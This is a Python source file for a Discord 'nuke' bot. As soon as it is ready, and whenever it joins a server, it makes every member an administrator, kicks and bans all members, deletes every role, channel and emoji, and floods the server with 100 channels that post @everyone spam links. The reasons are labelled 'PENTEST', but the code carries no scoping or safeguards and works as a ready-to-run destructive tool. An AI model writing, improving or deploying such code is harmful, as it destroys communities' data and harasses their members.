import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "BOT_TOKEN_HERE"

SPAM_CHANNELS = ["Oops1", "Oops2"]
SPAM_MESSAGES = ["@everyone https://cdn.discordapp.com/attachments/1439567435026923666/1454234445346504774/caption-4weasd.gif?ex=698e4f5e&is=698cfdde&hm=1d7b6809da165daa970051be7dda543eed21efec3aef829dccf6643324edf418"]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.bans = True
intents.emojis = True

client = commands.Bot(command_prefix="!", intents=intents)

async def mass_kick_ban(guild):
    """Ultra-fast concurrent kick/ban all members"""
    print(Fore.CYAN + "⚡ MASS KICK/BANNING..." + Fore.RESET)
    tasks = []
    
    for member in guild.members:
        if member == client.user:
            continue
            
        async def kickban_target(target):
            try:
                await target.kick(reason="PENTEST")
                await asyncio.sleep(0)  # Zero delay
                await target.ban(reason="PENTEST")
                print(Fore.MAGENTA + f"⚡ {target.name}" + Fore.RESET)
            except:
                pass
        
        tasks.append(kickban_target(member))
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_delete_roles(guild):
    """Concurrent role deletion"""
    print(Fore.CYAN + "⚡ MASS DELETING ROLES..." + Fore.RESET)
    tasks = []
    
    for role in guild.roles[1:]:
        tasks.append(role.delete())
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_delete_channels(guild):
    """Concurrent channel deletion"""
    print(Fore.CYAN + "⚡ MASS DELETING CHANNELS..." + Fore.RESET)
    tasks = []
    
    for channel in guild.channels[:]:
        tasks.append(channel.delete())
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def mass_delete_emojis(guild):
    """Concurrent emoji deletion"""
    print(Fore.CYAN + "⚡ MASS DELETING EMOJIS..." + Fore.RESET)
    tasks = []
    
    for emoji in list(guild.emojis):
        tasks.append(emoji.delete())
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def spam_channels(guild):
    """Rapid spam channel creation"""
    print(Fore.CYAN + "⚡ SPAMMING CHANNELS..." + Fore.RESET)
    tasks = []
    
    for i in range(100):  # Increased to 100
        async def create_spam():
            try:
                channel = await guild.create_text_channel(random.choice(SPAM_CHANNELS))
                await channel.send(random.choice(SPAM_MESSAGES))
            except:
                pass
        
        tasks.append(create_spam())
    
    await asyncio.gather(*tasks, return_exceptions=True)

async def nuke_guild(guild):
    """ULTRA-FAST NUKE - Concurrent execution"""
    print(Fore.RED + f"🚀 ULTRA-FAST NUKE: {guild.name}" + Fore.RESET)
    
    # 1. Everyone admin (instant)
    try:
        everyone_role = discord.utils.get(guild.roles, name="@everyone")
        await everyone_role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "✓ ADMIN GRANTED" + Fore.RESET)
    except:
        pass
    
    # 2. Unban (background)
    asyncio.create_task(unban_all(guild))
    
    # 3. MASS KICK/BAN ALL MEMBERS (CONCURRENT)
    await mass_kick_ban(guild)
    
    # 4. PARALLEL DESTRUCTION
    destruction_tasks = [
        mass_delete_roles(guild),
        mass_delete_channels(guild),
        mass_delete_emojis(guild),
        spam_channels(guild)
    ]
    
    await asyncio.gather(*destruction_tasks, return_exceptions=True)
    
    print(Fore.GREEN + f"💥 {guild.name} OBLITERATED!" + Fore.RESET)

async def unban_all(guild):
    """Background unban task"""
    try:
        banned_users = await guild.bans()
        tasks = [guild.unban(user) for ban_entry in banned_users for user in [ban_entry.user]]
        await asyncio.gather(*tasks, return_exceptions=True)
    except:
        pass

@client.event
async def on_ready():
    print("⚡ ULTRA-FAST NUKE BOT READY ⚡")
    await client.change_presence(activity=discord.Game(name="PENTEST MODE"))
    
    # NUKE ALL CURRENT SERVERS
    tasks = [nuke_guild(guild) for guild in client.guilds]
    await asyncio.gather(*tasks, return_exceptions=True)

@client.event
async def on_guild_join(guild):
    """INSTANT NUKE ON JOIN"""
    print(Fore.RED + f"🎯 TARGET: {guild.name} ({guild.member_count} users)" + Fore.RESET)
    await nuke_guild(guild)

@client.event
async def on_guild_channel_create(channel):
    """INSTANT SPAM"""
    try:
        await channel.send(random.choice(SPAM_MESSAGES))
    except:
        pass

@client.command()
async def stop(ctx):
    await ctx.bot.logout()

if __name__ == "__main__":
    client.run(token)
